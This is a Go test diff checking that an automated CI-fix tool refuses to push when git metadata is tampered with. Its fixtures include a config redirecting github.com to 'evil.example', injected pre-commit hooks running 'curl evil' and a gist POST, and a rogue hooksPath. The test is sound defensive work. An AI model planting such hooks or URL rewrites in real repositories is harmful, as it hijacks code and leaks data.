@@ -4,6 +4,8 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 	"time"
@@ -807,4 +809,101 @@ func hasCall(calls []runnerCall, name string, argPrefix ...string) bool {
 		}
 	}
 	return false
+}
+
+// seedGitDir simulates the metadata a fresh clone leaves behind.
+func seedGitDir(t *testing.T, workDir string) {
+	t.Helper()
+	if err := os.MkdirAll(filepath.Join(workDir, ".git", "hooks"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	files := map[string]string{
+		".git/config":                  "[remote \"origin\"]\n\turl = https://github.com/o/r.git\n",
+		".git/hooks/pre-commit.sample": "#!/bin/sh\n",
+	}
+	for p, body := range files {
+		if err := os.WriteFile(filepath.Join(workDir, p), []byte(body), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
+func TestRunCIFixGitMetadataGate(t *testing.T) {
+	cases := []struct {
+		name     string
+		seed     bool
+		mutate   func(t *testing.T, workDir string)
+		wantPush bool
+	}{
+		{"untouched .git publishes", true, func(*testing.T, string) {}, true},
+		{"no .git (boundary) publishes", false, func(*testing.T, string) {}, true},
+		{"rewritten config aborts", true, func(t *testing.T, wd string) {
+			p := filepath.Join(wd, ".git", "config")
+			if err := os.WriteFile(p, []byte("[url \"https://evil.example/\"]\n\tinsteadOf = https://github.com/\n"), 0o644); err != nil {
+				t.Fatal(err)
+			}
+		}, false},
+		{"added hook aborts", true, func(t *testing.T, wd string) {
+			p := filepath.Join(wd, ".git", "hooks", "pre-commit")
+			if err := os.WriteFile(p, []byte("#!/bin/sh\ngh api -X POST /gists\n"), 0o755); err != nil {
+				t.Fatal(err)
+			}
+		}, false},
+		{"modified hook aborts", true, func(t *testing.T, wd string) {
+			p := filepath.Join(wd, ".git", "hooks", "pre-commit.sample")
+			if err := os.WriteFile(p, []byte("#!/bin/sh\ncurl evil\n"), 0o755); err != nil {
+				t.Fatal(err)
+			}
+		}, false},
+		{"config created where none existed aborts", false, func(t *testing.T, wd string) {
+			if err := os.MkdirAll(filepath.Join(wd, ".git"), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(filepath.Join(wd, ".git", "config"), []byte("[core]\n\thooksPath = /tmp/x\n"), 0o644); err != nil {
+				t.Fatal(err)
+			}
+		}, false},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			workDir := t.TempDir()
+			if tc.seed {
+				seedGitDir(t, workDir)
+			}
+			var comment string
+			fr := &fakeRunner{respond: func(call runnerCall) ([]byte, error) {
+				if argsMatch(call, "gh", "pr", "comment") {
+					data, err := os.ReadFile(call.args[len(call.args)-1])
+					comment = string(data)
+					return nil, err
+				}
+				return ciHappyResponder(call)
+			}}
+			verify := func(wd, logs string, env []string, out io.Writer) (verifyVerdict, error) {
+				tc.mutate(t, wd)
+				return fixedVerdict(), nil
+			}
+			res, err := runCIFix(fr.run, okReverifyRunner().run, verify,
+				"o/r", "<!-- m -->", workDir, PR{Number: 3, HeadRefName: "renovate/z"}, "logs", nil, io.Discard)
+			if tc.wantPush {
+				if err != nil || !res.Pushed {
+					t.Fatalf("runCIFix: want push, got res=%+v err=%v", res, err)
+				}
+				return
+			}
+			if err == nil || res.Pushed {
+				t.Fatalf("runCIFix: want abort without push, got res=%+v err=%v", res, err)
+			}
+			for _, c := range fr.calls {
+				for _, verb := range []string{"status", "add", "commit", "push"} {
+					if argsMatch(c, "git", verb) {
+						t.Errorf("runCIFix: want no git %s after tampering, got %v", verb, c)
+					}
+				}
+			}
+			if !strings.Contains(comment, "<!-- m -->") || !strings.Contains(comment, "git metadata") {
+				t.Errorf("runCIFix: want git-metadata abort comment with marker, got %q", comment)
+			}
+		})
+	}
 }
